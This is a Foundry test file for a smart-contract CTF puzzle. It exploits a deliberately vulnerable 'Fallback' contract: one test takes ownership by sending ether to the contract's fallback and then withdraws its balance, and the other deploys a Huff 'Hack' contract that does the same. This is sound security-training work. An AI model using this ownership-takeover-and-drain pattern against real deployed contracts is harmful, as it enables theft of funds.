// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Fallback} from "src/Challenge1-delegatecall/Puzzle.sol";

contract SimpleStoreTest is Test {
    /// @dev Address of the SimpleStore contract.
    Fallback public puzzle;
    address player = makeAddr("player");
    address realOwner;

    /// @dev Setup the testing environment.
    function setUp() public {
        puzzle = new Fallback();
        //simpleStore = SimpleStore(HuffDeployer.deploy("SimpleStore"));
        vm.label(puzzle.owner(), "owner");
        realOwner = puzzle.owner();
        vm.deal(player, 3);
    }

    
    function testSimpleHack() public {
        vm.startPrank(player);
        puzzle.contribute{value: 1}();
        vm.expectRevert();
        puzzle.withdraw();
        assertEq(address(puzzle).balance, 1);

        address(puzzle).call{value: 2}("");
        puzzle.withdraw();
        assertEq(puzzle.owner(), player);
        assertEq(address(puzzle).balance, 0);
        vm.stopPrank();
    }

    
    function testHackHuff() public {
        address hack = HuffDeployer.deploy("Challenge1-delegatecall/Hack");
        IHack(hack).hack{value: 3}(address(puzzle));
        
        assertEq(address(puzzle).balance, 0);
        assertEq(puzzle.owner(), hack);
    }

    receive() external payable {
        
    }
}

interface IHack {
    function hack(address _target) external payable;
}